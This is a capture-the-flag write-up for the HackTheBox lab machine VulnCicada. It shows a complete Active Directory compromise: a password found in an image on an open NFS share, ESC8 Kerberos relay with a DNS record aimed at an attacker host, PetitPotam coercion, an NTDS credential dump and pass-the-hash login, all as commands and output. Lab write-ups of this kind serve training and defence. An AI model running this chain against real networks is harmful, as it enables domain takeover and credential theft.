---
title: "[EN] - HackTheBox: VulnCicada Write-Up"
date: 2026-01-25 11:07:00 +0700
categories: [HackTheBox, Boxes, Medium, Windows]
tags: [Credential exposure, Kerberos relay, ADCS ESC8, Pass-the-Ticket, Kerberos]
description: VulnCicada is a Medium Windows Active Directory machine that involves discovering a password inside an image on a public share. With that password an attacker is able to discover that the machine is vulnerable to ESC8 and can use Kerberos relaying to bypass self-relay restrictions in order to get a certificate as the machine account itself. With this new certificate, we are able to dump the hashes of the Administrator user and thus compromise the whole domain.
image: /assets/img/HTB-VulnCicada_banner.png
---

## Enumeration

### Open TCP Ports

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ sudo nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.234.48
Starting Nmap <REDACTED> ( https://nmap.org ) at 2026-01-25 13:25 CET
Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.04% done; ETC: 13:28 (0:00:01 remaining)
Nmap scan report for 10.129.234.48
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 12:26:05Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-25T12:01:38
|_Not valid after:  2027-01-25T12:01:38
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-25T12:01:38
|_Not valid after:  2027-01-25T12:01:38
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-25T12:01:38
|_Not valid after:  2027-01-25T12:01:38
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-25T12:01:38
|_Not valid after:  2027-01-25T12:01:38
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-01-24T12:09:15
|_Not valid after:  2026-07-26T12:09:15
|_ssl-date: 2026-01-25T12:27:41+00:00; -4s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing

<SNIP>

Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-25T12:27:04
|_  start_date: N/A
|_clock-skew: mean: -3s, deviation: 0s, median: -4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.62 seconds
```

---

### Web Recon

#### Directory Listing

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ ffuf -w `fzf-wordlists` -u http://10.129.234.48/FUZZ

<SNIP>
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.48/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 1179ms]
certsrv         [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 2181ms]
certenroll      [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 2902ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2898 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

The scan reveals two interesting paths (``certsrv`` and ``certenroll``). 
Their presence strongly suggests that an Active Directory Certificate Services (ADCS) server is running on ``DC-JPQ225.cicada.vl``.

---

## Initial Access & Privilege Escalation

Since the target exposes an NFS server, the first step is to check for accessible shares.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)
```

Since the ``/profiles`` share is open to everyone, we mount the share and inspect its content :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ mkdir nfs_share

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ sudo mount -t nfs 10.129.234.48:/profiles nfs_share

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ ls nfs_share
total 5,5K
drwxrwxrwx 2 nobody nogroup 64 15 sept.  2024 Administrator
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Daniel.Marshall
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Debra.Wright
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Jane.Carter
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Jordan.Francis
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Joyce.Andrews
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Katie.Ward
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Megan.Simpson
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Richard.Gibbons
drwxrwxrwx 2 nobody nogroup 64 15 sept.  2024 Rosie.Powell
drwxrwxrwx 2 nobody nogroup 64 13 sept.  2024 Shirley.West
```

The share contains directories named after what appear to be employee accounts. To confirm whether these correspond to valid domain users, we extract the names and run them through ``kerbrute`` :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ ls nfs_share | cut -d " " -f10 | sed '/^[[:space:]]*$/d' | tr A-Z a-z > domain_users.lst

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ cat domain_users.lst
administrator
daniel.marshall
debra.wright
jane.carter
jordan.francis
joyce.andrews
katie.ward
megan.simpson
richard.gibbons
rosie.powell
shirley.west

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ kerbrute userenum -d $DOMAIN --dc $DC_HOST /usr/share/wordlists/custom/statistically-likely-usernames/facebook-base-lists/john.smith-x500000.txt

<SNIP>

Version: <redacted> - 01/25/26 - Ronnie Flathers @ropnop

2026/01/25 15:59:40 >  Using KDC(s):
2026/01/25 15:59:40 >   DC-JPQ225.cicada.vl:88

2026/01/25 16:00:13 >  [+] VALID USERNAME:       katie.ward@cicada.vl
2026/01/25 16:00:24 >  [+] VALID USERNAME:       daniel.marshall@cicada.vl
2026/01/25 16:01:24 >  [+] VALID USERNAME:       debra.wright@cicada.vl
2026/01/25 16:01:25 >  [+] VALID USERNAME:       jane.carter@cicada.vl
2026/01/25 16:01:33 >  [+] VALID USERNAME:       megan.simpson@cicada.vl
2026/01/25 16:04:48 >  [+] VALID USERNAME:       jordan.francis@cicada.vl
2026/01/25 16:08:44 >  [+] VALID USERNAME:       richard.gibbons@cicada.vl
2026/01/25 16:11:38 >  [+] VALID USERNAME:       joyce.andrews@cicada.vl
2026/01/25 16:21:44 >  Done! Tested 499999 usernames (8 valid) in 1323.895 seconds
```

kerbrute confirms **8/11** names as valid domain users. With that established, we dig deeper into the share looking for sensitive files.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ sudo su

┌─[root@parrot]─[/home/tatsuki/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ #tree nfs_share/
nfs_share/
├── Administrator
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── vacation.png
├── Daniel.Marshall
├── Debra.Wright
├── Jane.Carter
├── Jordan.Francis
├── Joyce.Andrews
├── Katie.Ward
├── Megan.Simpson
├── Richard.Gibbons
├── Rosie.Powell
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── marketing.png
└── Shirley.West

16 directories, 6 files
```

Only two profiles contain files (``Administrator`` & ``Rosie.Powell``). The latter holds a file called ``marketing.png``, which we open to inspect :

```bash
┌─[root@parrot]─[/home/tatsuki/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ # open nfs_share/Rosie.Powell/marketing.png
```

![](/assets/img/HTB-VulnCicada-rosie_password.png)

The image reveals credentials. We confirm them against LDAP using NetExec :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ nxc ldap 10.129.234.48 -u 'rosie.powell' -p 'CiXXXXXX3' -k
LDAP    10.129.234.48   389    DC-JPQ225    [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP    10.129.234.48   389    DC-JPQ225    [+] cicada.vl\rosie.powell:CiXXXXXX3
```

The authentication succeeds. Note the ``-k`` flag as visible from the NetExec output, NTLM is disabled on this domain, so all authentication goes through Kerberos.

---

### Rosie.Powell -> Domain Admin

With valid domain credentials in hand, we enumerate the accessible SMB shares :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ nxc smb 10.129.234.48 -u 'rosie.powell' -p 'CiXXXXXX3' -k --shares
SMB   10.129.234.48   445    DC-JPQ225    [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB   10.129.234.48   445    DC-JPQ225    [+] cicada.vl\rosie.powell:CiXXXXXX3
SMB   10.129.234.48   445    DC-JPQ225    [*] Enumerated shares
SMB   10.129.234.48   445    DC-JPQ225    Share         Permissions     Remark
SMB   10.129.234.48   445    DC-JPQ225    -----         -----------     ------
SMB   10.129.234.48   445    DC-JPQ225    ADMIN$                        Remote Admin
SMB   10.129.234.48   445    DC-JPQ225    C$                            Default share
SMB   10.129.234.48   445    DC-JPQ225    CertEnroll    READ            Active Directory Certificate Services share
SMB   10.129.234.48   445    DC-JPQ225    IPC$          READ            Remote IPC
SMB   10.129.234.48   445    DC-JPQ225    NETLOGON      READ            Logon server share
SMB   10.129.234.48   445    DC-JPQ225    profiles$     READ,WRITE
SMB   10.129.234.48   445    DC-JPQ225    SYSVOL        READ            Logon server share
```

The presence of a ``CertEnroll`` share, combined with the ``certsrv`` and ``certenroll`` directories found earlier during directory fuzzing, confirms that an ADCS PKI is installed on the Domain Controller. 
The ``CertEnroll`` share is a strong indicator for an **ESC8** escalation path.

We verify this with NetExec's adcs module :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ nxc ldap DC-JPQ225.cicada.vl -u rosie.powell -p "CiXXXXXX3" -k -M adcs
LDAP   DC-JPQ225.cicada.vl 389    DC-JPQ225    [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP   DC-JPQ225.cicada.vl 389    DC-JPQ225    [+] cicada.vl\rosie.powell:CiXXXXXX3
ADCS   DC-JPQ225.cicada.vl 389    DC-JPQ225    [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS   DC-JPQ225.cicada.vl 389    DC-JPQ225    Found PKI Enrollment Server: DC-JPQ225.cicada.vl
ADCS   DC-JPQ225.cicada.vl 389    DC-JPQ225    Found CN: cicada-DC-JPQ225-CA
```

The PKI enrollment server is confirmed. We then run certipy to check for known vulnerable misconfigurations :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ certipy find -u "rosie.powell@cicada.vl" -p "CiXXXXXX3" -dc-ip 10.129.234.48 -dc-host DC-JPQ225.cicada.vl -vulnerable -stdout -k
<SNIP>

[!] KRB5CCNAME environment variable not set
[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:

<SNIP>

CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

The output confirms ESC8, web enrollment is enabled over HTTP and any member of ``Authenticated Users`` which includes ``rosie.powell`` can request certificates.

#### ESC8 Exploitation

ESC8 is typically exploited via NTLM relay, but since NTLM is disabled here we fall back to a Kerberos relay attack instead. The first step is to add a DNS record pointing to our attacking machine, so we can coerce the DC into authenticating to us :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ bloodyAD -k --host DC-JPQ225.cicada.vl -d 'cicada.vl' -u 'rosie.powell' add dnsRecord "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" <ATTACKER_IP>
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

With the DNS record in place, we start certipy in relay mode to intercept the coerced authentication and forward it to the ADCS web enrollment portal, requesting a certificate for the machine account ``DC-JPQ225$`` :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ certipy relay -target http://DC-JPQ225.cicada.vl/ -template DomainController
<SNIP>

[*] Targeting http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

We then use NetExec's ``coerce_plus`` module with the ``PetitPotam`` method to force **DC-JPQ225** to authenticate to the DNS hostname we created, which resolves to our attacking host :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'CiXXXXXX3' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB          DC-JPQ225.cicada.vl 445    DC-JPQ225    [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB          DC-JPQ225.cicada.vl 445    DC-JPQ225    [+] cicada.vl\rosie.powell:CiXXXXXX3
COERCE_PLUS  DC-JPQ225.cicada.vl 445    DC-JPQ225    VULNERABLE, PetitPotam
COERCE_PLUS  DC-JPQ225.cicada.vl 445    DC-JPQ225    Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

Back on the certipy listener, we can see the DC attempting to authenticate to our host. 
The relay successfully forwards the request to the ADCS web enrollment portal, which issues a certificate for the machine account.

```bash
<SNIP>

[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.234.48, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://DC-JPQ225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 90
[*] Retrieving certificate for request ID: 90
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=90 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...
```

With the DC machine account certificate in hand, we can use it to retrieve its NTLM hash via PKINIT :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ certipy auth -pfx 'dc-jpq225.pfx' -dc-ip 10.129.234.48 -username 'dc-jpq225$' -domain 'cicada.vl'
<SNIP>

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a659XXXXXXXXXXXXXXXXXXXXXXXbeee3
```

We verify the recovered hash against LDAP :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ nxc ldap DC-JPQ225.cicada.vl -u 'dc-jpq225$' -H 'a659XXXXXXXXXXXXXXXXXXXXXXXbeee3' -k
LDAP   DC-JPQ225.cicada.vl 389    DC-JPQ225    [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP   DC-JPQ225.cicada.vl 389    DC-JPQ225    [+] cicada.vl\dc-jpq225$:a659XXXXXXXXXXXXXXXXXXXXXXXbeee3
```

#### NTDS Dump

Since the DC machine account has ``DCSync`` privileges, we can use it to dump all domain credentials :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ nxc smb $DC_HOST -u 'dc-jpq225$' -H 'a659XXXXXXXXXXXXXXXXXXXXXXXbeee3' -k --ntds
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [+] cicada.vl\dc-jpq225$:a659XXXXXXXXXXXXXXXXXXXXXXXbeee3
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0XXXXXXXXXXXXXXXXXXXXXXXa5e87:::

<SNIP>

SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [+] Dumped 14 NTDS hashes to /home/tatsuki/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-01-29_204043.ntds of which 13 were added to the database
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [*] To extract only enabled accounts from the output file, run the following command:
SMB    DC-JPQ225.cicada.vl 445    DC-JPQ225    [*] grep -iv disabled /home/tatsuki/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-01-29_204043.ntds | cut -d ':' -f1
```

#### DC Authentication as Administrator

Using the Administrator hash recovered from the NTDS dump, we request a Kerberos TGT and then connect to the DC via Evil-WinRM :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ getTGT.py -dc-ip 10.129.234.48 'cicada.vl/Administrator' -hashes ':85a0XXXXXXXXXXXXXXXXXXXXXXXa5e87'
<SNIP>
[*] Saving ticket in Administrator.ccache

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ export KRB5CCNAME=Administrator.ccache

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@CICADA.VL

Valid starting       Expires              Service principal
26/01/2026 20:44:25  27/01/2026 06:44:25  krbtgt/CICADA.VL@CICADA.VL
        renew until 27/01/2026 20:44:26

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/VulnCicada]
└──╼ [★]$ evil-winrm -i 'DC-JPQ225.cicada.vl' -r 'cicada.vl'

<SNIP>

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\dc-jpq225\profiles$\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/15/2024   6:26 AM           2304 Microsoft Edge.lnk
-ar---         1/29/2026   6:26 AM             34 root.txt
-ar---         1/29/2026   6:26 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat user.txt
c3deXXXXXXXXXXXXXXXXXXXXXXXa1b81

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f116XXXXXXXXXXXXXXXXXXXXXXXa3532
```